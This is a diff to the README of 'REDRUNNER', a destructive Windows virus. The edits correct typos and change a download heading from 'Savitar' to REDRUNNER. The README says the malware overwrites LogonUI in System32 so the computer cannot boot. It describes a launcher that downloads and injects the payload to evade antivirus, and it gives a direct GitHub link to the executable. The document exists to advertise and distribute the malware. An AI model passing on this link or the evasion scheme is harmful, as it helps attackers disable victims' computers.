@@ -1,13 +1,13 @@
 # ♦️ REDRUNNER ♦️
 
-# REDRUNNER ?! Whati it is ? How it works ?
+# REDRUNNER ?! What it is ? How it works ?
 REDRUNNER is's powerfull virus which overwrite LogonUI file in System32 and don't give chance to start computer
 
 # Why 2 files ?
 This file is virus file which AV detect. Second File is Launcher which download this file and inject this file.
 This method do 100% AV bypass
 
-# If you like download Savitar
+# If you like download REDRUNNER
 https://github.com/KOZ1OL/REDRUNNER-LUNCHER/raw/main/REDRUNNER.exe
 
 
